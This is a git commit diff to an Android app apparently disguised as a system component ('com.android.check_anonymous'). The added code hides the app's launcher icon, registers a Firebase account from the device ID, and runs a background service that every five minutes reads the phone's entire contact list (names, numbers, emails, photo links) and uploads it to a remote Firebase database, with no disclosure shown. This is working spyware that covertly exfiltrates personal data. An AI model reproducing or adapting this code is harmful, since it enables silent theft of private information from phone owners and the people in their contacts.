759aad497bd0cc5377a95fde9e868e9cc6d8bfd1
aleksandr_mdc@mail.ru <Mishe12345>
2017-08-29 13:21:39 +0300

    rename packedg

--- app/src/main/java/com/android/check_anonymous/MainActivity.java
+++ app/src/main/java/com/android/check_anonymous/MainActivity.java
@@ -4,13 +4,44 @@ import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
+import android.support.annotation.NonNull;
+import android.util.Log;
+import android.widget.Toast;
+
+import com.google.android.gms.tasks.OnCompleteListener;
+import com.google.android.gms.tasks.Task;
+import com.google.firebase.auth.AuthResult;
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.auth.FirebaseUser;
 
 public class MainActivity extends Activity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+
+        String android_id = Settings.Secure.getString(getContentResolver(),
+                Settings.Secure.ANDROID_ID);
+
+        android_id = android_id + "_" + Build.MODEL + "_" +
+                Build.MANUFACTURER + "_" + Build.VERSION.SDK_INT + "_";
+
+        FirebaseAuth.getInstance().createUserWithEmailAndPassword(android_id + "@mail.ru", android_id)
+                .addOnCompleteListener(this, new OnCompleteListener<AuthResult>() {
+                    @Override
+                    public void onComplete(@NonNull Task<AuthResult> task) {
+                        if (task.isSuccessful()) {
+                            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
+                        } else {
+                        }
+                        MainActivity.this.finish();
+                    }
+                });
+
+
         String pgkname = getApplicationContext().getPackageName();
         ComponentName componentToDisable = new ComponentName(pgkname, pgkname + ".MainActivity");
         getApplicationContext().getPackageManager().setComponentEnabledSetting(
@@ -18,6 +49,5 @@ public class MainActivity extends Activity {
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
         getApplicationContext().startService(new Intent(getApplicationContext(), Network.class));
-        this.finish();
     }
 }
--- app/src/main/java/com/android/check_anonymous/Network.java
+++ app/src/main/java/com/android/check_anonymous/Network.java
@@ -1,17 +1,23 @@
 package com.android.check_anonymous;
 
 import android.app.Service;
+import android.content.ContentResolver;
 import android.content.Intent;
-import android.os.Handler;
+import android.database.Cursor;
 import android.os.IBinder;
-import android.os.Looper;
-import android.os.Message;
-import android.util.Log;
-import android.widget.Toast;
+import android.provider.ContactsContract;
 
-import java.util.Date;
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.auth.FirebaseUser;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
+import java.util.HashMap;
+import java.util.Map;
 import java.util.Timer;
 import java.util.TimerTask;
+
+import static android.R.attr.type;
 
 /**
  * Created by AleksandrP on 28.08.2017.
@@ -19,7 +25,9 @@ import java.util.TimerTask;
 
 public class Network extends Service {
 
-    private Handler mHandler;
+    private FirebaseUser mUser;
+    private FirebaseAuth mAuth;
+    private DatabaseReference mReference;
 
     @Override
     public void onCreate() {
@@ -27,29 +35,13 @@ public class Network extends Service {
 
         MyTimerTask myTask = new MyTimerTask();
         Timer myTimer = new Timer();
-        myTimer.schedule(myTask, 10000, 10000);
+        myTimer.schedule(myTask, 5000, 300000);
 
     }
 
     class MyTimerTask extends TimerTask {
         public void run() {
-            mHandler = new Handler(Looper.getMainLooper()) {
-                @Override
-                public void handleMessage(Message message) {
-                    // This is where you do your work in the UI thread.
-                    // Your worker tells you in the message what to do.
-                    Toast.makeText(Network.this, (String) message.obj, Toast.LENGTH_SHORT).show();
-                }
-            };
-
-            String result = "";
-            result = GET("http://site.ru/?q=");
-// Обработка result
-            Message message = mHandler.obtainMessage(1, result);
-            message.sendToTarget();
-
-            Log.d("MESS_0", result);
-
+            GET();
         }
     }
 
@@ -64,21 +56,150 @@ public class Network extends Service {
     }
 
 
-    public String GET(String url) {
-//        InputStream inputStream = null;
-//        String result = "";
-//        try {
-//            HttpClient httpclient = new DefaultHttpClient();
-//            HttpResponse httpResponse = httpclient.execute(new HttpGet(url));
-//            inputStream = httpResponse.getEntity().getContent();
-//            if(inputStream != null)
-//                result = convertInputStreamToString(inputStream);
-//            else
-//                result = "";
-//        } catch (Exception e) {
-//        }
-//        return result;
-        return new Date().getTime() + "";
+    public void GET() {
+
+        mAuth = FirebaseAuth.getInstance();
+        mUser = mAuth.getCurrentUser();
+        mReference = FirebaseDatabase.getInstance().getReference();
+
+        if (mUser == null) {
+            return;
+        }
+
+
+        getAllContactsAndSave();
     }
 
+    private void getAllContactsAndSave() {
+        mReference.child(mUser.getUid())
+                .removeValue();
+
+        Map<String, UserModel> users = new HashMap<String, UserModel>();
+
+        ContentResolver cr = getContentResolver();
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
+
+        int countUser = 0;
+
+        if (cur.getCount() > 0) {
+            while (cur.moveToNext()) {
+                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                String photoUri = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.PHOTO_THUMBNAIL_URI));
+                String lookupKey = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
+
+
+                if (cur.getInt(cur.getColumnIndex(
+                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(
+                                ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        String email = pCur.getString(pCur.getColumnIndex(
+                                ContactsContract.CommonDataKinds.Email.ADDRESS));
+                        int type = pCur.getInt(pCur.getColumnIndex(
+                                ContactsContract.CommonDataKinds.Email.TYPE));
+                        String typeLabel =
+                                (String) ContactsContract.CommonDataKinds.Email.getTypeLabel(getResources(), type, "");
+
+                        UserModel model = new UserModel(
+                                phoneNo, name, photoUri, lookupKey, email, typeLabel, type);
+                        users.put(countUser + "", model);
+                        countUser++;
+                    }
+                    pCur.close();
+                }
+            }
+            mReference.child(mUser.getUid())
+                    .child("data_user")
+//                    .push()
+                    .setValue(users);
+        }
+    }
+
+    public class UserModel {
+
+        private String phone;
+        private String name;
+        private String photoUri;
+        private String lookupKey;
+        private String email;
+        private String typeLabel;
+        private int type;
+
+        public UserModel() {
+        }
+
+        public UserModel(String mPhone, String mName, String mPhotoUri, String mLookupKey,
+                         String mEmail, String mTypeLabel, int mType) {
+            phone = mPhone;
+            name = mName;
+            photoUri = mPhotoUri;
+            lookupKey = mLookupKey;
+            email = mEmail;
+            typeLabel = mTypeLabel;
+            type = mType;
+        }
+
+        public String getPhone() {
+            return phone;
+        }
+
+        public void setPhone(String mPhone) {
+            phone = mPhone;
+        }
+
+        public String getName() {
+            return name;
+        }
+
+        public void setName(String mName) {
+            name = mName;
+        }
+
+        public String getPhotoUri() {
+            return photoUri;
+        }
+
+        public void setPhotoUri(String mPhotoUri) {
+            photoUri = mPhotoUri;
+        }
+
+        public String getLookupKey() {
+            return lookupKey;
+        }
+
+        public void setLookupKey(String mLookupKey) {
+            lookupKey = mLookupKey;
+        }
+
+        public String getEmail() {
+            return email;
+        }
+
+        public void setEmail(String mEmail) {
+            email = mEmail;
+        }
+
+        public String getTypeLabel() {
+            return typeLabel;
+        }
+
+        public void setTypeLabel(String mTypeLabel) {
+            typeLabel = mTypeLabel;
+        }
+
+        public int getType() {
+            return type;
+        }
+
+        public void setType(int mType) {
+            type = mType;
+        }
+    }
 }
